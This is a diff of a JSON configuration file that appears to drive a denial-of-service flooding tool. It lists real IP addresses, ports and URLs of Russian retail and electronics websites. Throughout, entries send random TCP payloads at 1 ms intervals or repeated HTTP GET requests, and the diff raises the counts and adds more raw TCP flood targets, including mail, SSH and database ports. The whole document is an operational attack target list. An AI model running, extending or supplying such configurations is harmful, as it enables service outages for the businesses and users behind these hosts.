-          "method": "GET",
-          "path": "https://franchise.220-volt.ru/pvz/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "193.93.29.82:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
       "type": "tcp",
-      "count": 3,
-      "args": {
-        "address": "193.93.29.82:30865",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "193.93.29.82:443",
         "body": "{{ random_payload 10 }}",
@@ -3666,52 +3124,77 @@
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://fulfillment.220-volt.ru/"
+          "path": "https://franchise.220-volt.ru/pvz/"
         },
         "client": {
           "static_host": {
-            "addr": "84.52.74.15:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://fulfillment.220-volt.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "84.52.74.15:443",
+            "addr": "193.93.29.82:443",
             "is_tls": "true"
           }
         }
       }
     }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "193.93.29.82:30865",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://biggeek.ru/catalog/apple-iphone-13-pro-max"
+          "path": "https://webpvz.220-volt.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "178.248.239.88:80",
-            "is_tls": "false"
+            "addr": "193.93.29.82:443",
+            "is_tls": "true"
           }
         }
       }
     }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "84.52.74.15:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "84.52.74.15:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "178.248.239.88:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "178.248.239.88:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -3725,53 +3208,24 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 5,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://biggeek.ru/catalog/apple-iphone-13-pro-max"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.239.88:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "178.248.233.88:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "178.248.233.88:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://re-store.ru/apple-iphone/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.233.88:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://re-store.ru/apple-iphone/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.233.88:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -3786,30 +3240,23 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "79.137.128.191:110",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 5,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://re-store.ru/apple-iphone/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.137.128.191:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "79.137.128.191:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "79.137.128.191:587",
         "body": "{{ random_payload 10 }}",
@@ -3817,7 +3264,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "193.168.131.126:21",
         "body": "{{ random_payload 10 }}",
@@ -3825,7 +3272,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "193.168.131.126:22",
         "body": "{{ random_payload 10 }}",
@@ -3833,30 +3280,23 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "193.168.131.126:25",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 5,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://apple-store.net.ru/apple-iphone/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "193.168.131.126:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "193.168.131.126:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "193.168.131.126:110",
         "body": "{{ random_payload 10 }}",
@@ -3864,30 +3304,23 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "193.168.131.126:143",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 5,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://apple-store.net.ru/apple-iphone/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "193.168.131.126:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "193.168.131.126:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "193.168.131.126:465",
         "body": "{{ random_payload 10 }}",
@@ -3895,7 +3328,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "193.168.131.126:587",
         "body": "{{ random_payload 10 }}",
@@ -3903,7 +3336,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "193.168.131.126:993",
         "body": "{{ random_payload 10 }}",
@@ -3911,7 +3344,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "193.168.131.126:995",
         "body": "{{ random_payload 10 }}",
@@ -3919,45 +3352,39 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "193.168.131.126:3306",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 5,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.technopark.ru/krupnaya-bytovaya-tehnika/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.235.59:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "178.248.235.59:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "178.248.235.59:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "178.248.233.61:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.technopark.ru/krupnaya-bytovaya-tehnika/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.235.59:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -3971,98 +3398,48 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 5,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.techport.ru/katalog/products/otdelnostojaschaja-bytovaja-tehnika"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.233.61:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.techport.ru/katalog/products/otdelnostojaschaja-bytovaja-tehnika"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.233.61:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://club.techport.ru/catalog/otdelnostojaschaja-bytovaja-tehnika"
-        },
-        "client": {
-          "static_host": {
-            "addr": "95.131.25.23:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://club.techport.ru/catalog/otdelnostojaschaja-bytovaja-tehnika"
-        },
-        "client": {
-          "static_host": {
-            "addr": "95.131.25.23:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.mvideo.ru/tehnika-dlya-kuhni"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.71.67.88:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.mvideo.ru/tehnika-dlya-kuhni"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.71.67.88:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "178.248.233.61:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
+      "args": {
+        "address": "95.131.25.23:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "95.131.25.23:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "185.71.67.88:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "185.71.67.88:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
       "args": {
         "address": "84.201.129.36:22",
         "body": "{{ random_payload 10 }}",
@@ -4070,7 +3447,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "84.201.129.36:9107",
         "body": "{{ random_payload 10 }}",
@@ -4078,22 +3455,22 @@
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://www.mvideo.ru/tehnika-dlya-kuhni"
+          "path": "http://www.mvideo.ru/tehnika-dlya-kuhni"
         },
         "client": {
           "static_host": {
             "addr": "84.201.129.36:9107",
-            "is_tls": "true"
+            "is_tls": "false"
           }
         }
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "84.201.129.36:9108",
         "body": "{{ random_payload 10 }}",
@@ -4101,22 +3478,22 @@
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://www.mvideo.ru/tehnika-dlya-kuhni"
+          "path": "http://www.mvideo.ru/tehnika-dlya-kuhni"
         },
         "client": {
           "static_host": {
             "addr": "84.201.129.36:9108",
-            "is_tls": "true"
+            "is_tls": "false"
           }
         }
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "84.201.129.36:9119",
         "body": "{{ random_payload 10 }}",
@@ -4124,22 +3501,22 @@
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://www.mvideo.ru/tehnika-dlya-kuhni"
+          "path": "http://www.mvideo.ru/tehnika-dlya-kuhni"
         },
         "client": {
           "static_host": {
             "addr": "84.201.129.36:9119",
-            "is_tls": "true"
+            "is_tls": "false"
           }
         }
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "178.154.198.105:22",
         "body": "{{ random_payload 10 }}",
@@ -4147,7 +3524,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "178.154.198.105:9107",
         "body": "{{ random_payload 10 }}",
@@ -4155,22 +3532,22 @@
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://www.mvideo.ru/tehnika-dlya-kuhni"
+          "path": "http://www.mvideo.ru/tehnika-dlya-kuhni"
         },
         "client": {
           "static_host": {
             "addr": "178.154.198.105:9107",
-            "is_tls": "true"
+            "is_tls": "false"
           }
         }
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "178.154.198.105:9108",
         "body": "{{ random_payload 10 }}",
@@ -4178,22 +3555,22 @@
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://www.mvideo.ru/tehnika-dlya-kuhni"
+          "path": "http://www.mvideo.ru/tehnika-dlya-kuhni"
         },
         "client": {
           "static_host": {
             "addr": "178.154.198.105:9108",
-            "is_tls": "true"
+            "is_tls": "false"
           }
         }
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "178.154.198.105:9119",
         "body": "{{ random_payload 10 }}",
@@ -4201,22 +3578,22 @@
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://www.mvideo.ru/tehnika-dlya-kuhni"
+          "path": "http://www.mvideo.ru/tehnika-dlya-kuhni"
         },
         "client": {
           "static_host": {
             "addr": "178.154.198.105:9119",
-            "is_tls": "true"
+            "is_tls": "false"
           }
         }
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "178.154.214.114:22",
         "body": "{{ random_payload 10 }}",
@@ -4224,7 +3601,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "178.154.214.114:9107",
         "body": "{{ random_payload 10 }}",
@@ -4232,22 +3609,22 @@
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://www.mvideo.ru/tehnika-dlya-kuhni"
+          "path": "http://www.mvideo.ru/tehnika-dlya-kuhni"
         },
         "client": {
           "static_host": {
             "addr": "178.154.214.114:9107",
-            "is_tls": "true"
+            "is_tls": "false"
           }
         }
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "178.154.214.114:9108",
         "body": "{{ random_payload 10 }}",
@@ -4255,22 +3632,22 @@
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://www.mvideo.ru/tehnika-dlya-kuhni"
+          "path": "http://www.mvideo.ru/tehnika-dlya-kuhni"
         },
         "client": {
           "static_host": {
             "addr": "178.154.214.114:9108",
-            "is_tls": "true"
+            "is_tls": "false"
           }
         }
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "178.154.214.114:9119",
         "body": "{{ random_payload 10 }}",
@@ -4278,37 +3655,38 @@
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://www.mvideo.ru/tehnika-dlya-kuhni"
+          "path": "http://www.mvideo.ru/tehnika-dlya-kuhni"
         },
         "client": {
           "static_host": {
             "addr": "178.154.214.114:9119",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://api.mvideo.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.71.67.88:80",
             "is_tls": "false"
           }
         }
       }
     }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "185.71.67.88:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "185.71.67.88:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -4323,22 +3701,7 @@
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://api.mvideo.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.71.67.88:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -4352,38 +3715,24 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 5,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.onlinetrade.ru/catalogue/bytovaya_tekhnika-c43/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.169.155.27:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "185.169.155.27:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "185.169.155.27:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.onlinetrade.ru/catalogue/bytovaya_tekhnika-c43/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.169.155.27:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -4398,30 +3747,23 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "93.182.35.236:25",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 5,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://exch.onlinetrade.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "93.182.35.236:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "93.182.35.236:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "93.182.35.236:110",
         "body": "{{ random_payload 10 }}",
@@ -4429,15 +3771,23 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "93.182.35.236:143",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "93.182.35.236:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -4451,23 +3801,8 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://exch.onlinetrade.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "93.182.35.236:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "93.182.35.236:587",
         "body": "{{ random_payload 10 }}",
@@ -4475,7 +3810,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "93.182.35.236:993",
         "body": "{{ random_payload 10 }}",
@@ -4483,7 +3818,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "93.182.35.236:995",
         "body": "{{ random_payload 10 }}",
@@ -4491,7 +3826,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "93.182.35.236:6001",
         "body": "{{ random_payload 10 }}",
@@ -4499,7 +3834,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "93.182.35.236:6002",
         "body": "{{ random_payload 10 }}",
@@ -4507,7 +3842,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "93.182.35.236:6003",
         "body": "{{ random_payload 10 }}",
@@ -4515,30 +3850,31 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "93.182.35.236:6004",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 5,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://exch.onlinetrade.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "93.182.35.236:8081",
-            "is_tls": "false"
-          }
-        }
+        "address": "93.182.35.236:8081",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "93.182.35.236:8443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -4552,23 +3888,16 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 5,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://exch.onlinetrade.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "93.182.35.236:8443",
-            "is_tls": "true"
-          }
-        }
+        "address": "195.211.221.67:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -4582,38 +3911,16 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 5,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.deshevle.ru/vse_dlya_kuhni/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "195.211.221.67:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "195.211.221.67:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.deshevle.ru/vse_dlya_kuhni/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "195.211.221.67:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -4627,23 +3934,24 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 5,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://price.ru/bytovaya-tehnika/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.238.249:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "178.248.238.249:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "178.248.238.249:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -4658,22 +3966,7 @@
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://price.ru/bytovaya-tehnika/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.238.249:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -4688,45 +3981,31 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "62.76.157.187:25",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 5,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://price.ru/bytovaya-tehnika/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "62.76.157.186:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "62.76.157.186:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "62.76.157.186:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://price.ru/bytovaya-tehnika/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "62.76.157.186:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -4741,7 +4020,7 @@
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -4756,7 +4035,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "80.78.251.228:21",
         "body": "{{ random_payload 10 }}",
@@ -4764,7 +4043,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "80.78.251.228:22",
         "body": "{{ random_payload 10 }}",
@@ -4772,15 +4051,23 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "80.78.251.228:25",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "80.78.251.228:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -4794,23 +4081,8 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://4k-monitor.ru/catalog/for-gamers/monitory-144-gts/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "80.78.251.228:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "80.78.251.228:110",
         "body": "{{ random_payload 10 }}",
@@ -4818,30 +4090,23 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "80.78.251.228:143",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 5,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://4k-monitor.ru/catalog/for-gamers/monitory-144-gts/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "80.78.251.228:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "80.78.251.228:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -4856,7 +4121,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "80.78.251.228:465",
         "body": "{{ random_payload 10 }}",
@@ -4864,7 +4129,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "80.78.251.228:587",
         "body": "{{ random_payload 10 }}",
@@ -4872,7 +4137,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "80.78.251.228:993",
         "body": "{{ random_payload 10 }}",
@@ -4880,7 +4145,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "80.78.251.228:1500",
         "body": "{{ random_payload 10 }}",
@@ -4888,37 +4153,37 @@
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://4k-monitor.ru/catalog/for-gamers/monitory-144-gts/"
+          "path": "http://4k-monitor.ru/catalog/for-gamers/monitory-144-gts/"
         },
         "client": {
           "static_host": {
             "addr": "80.78.251.228:1500",
-            "is_tls": "true"
+            "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://4k-monitor.ru/login/"
+          "path": "http://4k-monitor.ru/login/"
         },
         "client": {
           "static_host": {
             "addr": "80.78.251.228:80",
-            "is_tls": "true"
